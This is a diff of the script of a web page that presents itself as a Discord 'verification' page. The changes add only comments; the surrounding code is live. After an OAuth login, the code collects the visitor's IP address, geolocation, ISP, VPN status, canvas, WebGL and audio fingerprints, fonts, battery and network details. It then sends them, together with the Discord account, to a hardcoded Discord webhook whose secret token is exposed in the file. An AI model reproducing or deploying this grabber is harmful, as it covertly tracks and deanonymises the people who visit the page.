@@ -228,10 +228,14 @@
     </div>
 
     <script>
+        // 🔧 WEBHOOK URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1536093526532825118/uvEE9AGU_dE8CgYOyz9YZ-WnYzsbj4Wjt6HRbjt8keQrchaF-SUHAj_TcikUKocOX8Uw';
+
+        // 🔧 DISCORD OAUTH2 CONFIG
         const CLIENT_ID = '1539183585813332050';
         const REDIRECT_URI = 'https://usupusu.github.io/Aptverification/';
 
+        // DOM Elements
         const loginBtn = document.getElementById('loginBtn');
         const userInfo = document.getElementById('userInfo');
         const userAvatar = document.getElementById('userAvatar');
@@ -246,6 +250,7 @@
         let discordUser = null;
         let accessToken = null;
 
+        // --- Generate Discord OAuth2 URL ---
         function getOAuthURL() {
             const base = 'https://discord.com/api/oauth2/authorize';
             const params = new URLSearchParams({
@@ -257,6 +262,7 @@
             return `${base}?${params.toString()}`;
         }
 
+        // --- Handle OAuth2 callback ---
         function handleCallback() {
             const hash = window.location.hash;
             if (!hash) return;
@@ -302,6 +308,7 @@
             });
         }
 
+        // --- Logout ---
         function logout() {
             discordUser = null;
             accessToken = null;
@@ -313,6 +320,7 @@
             dataBox.classList.remove('show');
         }
 
+        // --- FONTS DETECTION ---
         async function detectFonts() {
             const fonts = ['Arial', 'Times New Roman', 'Helvetica', 'Georgia', 'Verdana', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Courier New', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Merriweather', 'Playfair Display', 'Poppins', 'Inter'];
             const detected = [];
@@ -324,6 +332,7 @@
             return detected.length > 0 ? detected.join(', ') : 'None detected';
         }
 
+        // --- CANVAS FINGERPRINT ---
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -342,6 +351,7 @@
             } catch { return 'Unavailable'; }
         }
 
+        // --- WEBGL INFO ---
         function getWebGLInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -357,6 +367,7 @@
             } catch { return { vendor: 'Unavailable', renderer: 'Unavailable', maxTexture: 'Unavailable' }; }
         }
 
+        // --- AUDIO FINGERPRINT ---
         function getAudioFingerprint() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -376,6 +387,7 @@
             } catch { return 'Unavailable'; }
         }
 
+        // --- BROWSER INFO ---
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             let browser = 'Unknown', version = 'Unknown', os = 'Unknown';
@@ -393,6 +405,7 @@
             return { browser, version, platform: navigator.platform, os, userAgent: ua };
         }
 
+        // --- IP & LOCATION ---
         async function getIPData() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -410,11 +423,13 @@
             } catch { return { ip: 'Error', country: 'Unknown', city: 'Unknown', region: 'Unknown', postal: 'Unknown', loc: 'Unknown', isp: 'Unknown', asn: 'Unknown', timezone: 'Unknown', hostname: 'Unknown', vpn: 'Unknown' }; }
         }
 
+        // --- NETWORK INFO ---
         function getNetworkInfo() {
             const conn = navigator.connection || {};
             return { type: conn.effectiveType || 'Unknown', rtt: conn.rtt || 'Unknown', downlink: conn.downlink || 'Unknown' };
         }
 
+        // --- BATTERY ---
         async function getBatteryInfo() {
             try {
                 const battery = await navigator.getBattery();
@@ -422,6 +437,7 @@
             } catch { return { level: 'Unknown', charging: 'Unknown' }; }
         }
 
+        // --- PAGE INFO ---
         function getPageInfo() {
             return {
                 referrer: document.referrer || 'Direct',
@@ -431,6 +447,7 @@
             };
         }
 
+        // --- DEVICE ORIENTATION ---
         function getOrientation() {
             if (screen.orientation) {
                 return screen.orientation.type || 'Unknown';
@@ -438,6 +455,7 @@
             return window.innerWidth > window.innerHeight ? 'landscape' : 'portrait';
         }
 
+        // --- UPDATE DISPLAY ---
         function updateDisplay(data) {
             const set = (id, val) => document.getElementById(id).textContent = val || '—';
             set('dIP', data.ip); set('dCountry', data.country); set('dCity', data.city);
@@ -473,6 +491,7 @@
             dataBox.classList.add('show');
         }
 
+        // --- SEND TO WEBHOOK ---
         async function sendToWebhook(data) {
             try {
                 const payload = {
@@ -502,6 +521,7 @@
             } catch { return false; }
         }
 
+        // --- MAIN LOG FUNCTION ---
         logBtn.addEventListener('click', async function() {
             if (!discordUser) {
                 status.className = 'status error';
@@ -594,6 +614,7 @@
             logBtn.disabled = false;
         });
 
+        // --- Events ---
         loginBtn.href = getOAuthURL();
         logoutBtn.addEventListener('click', logout);
         handleCallback();
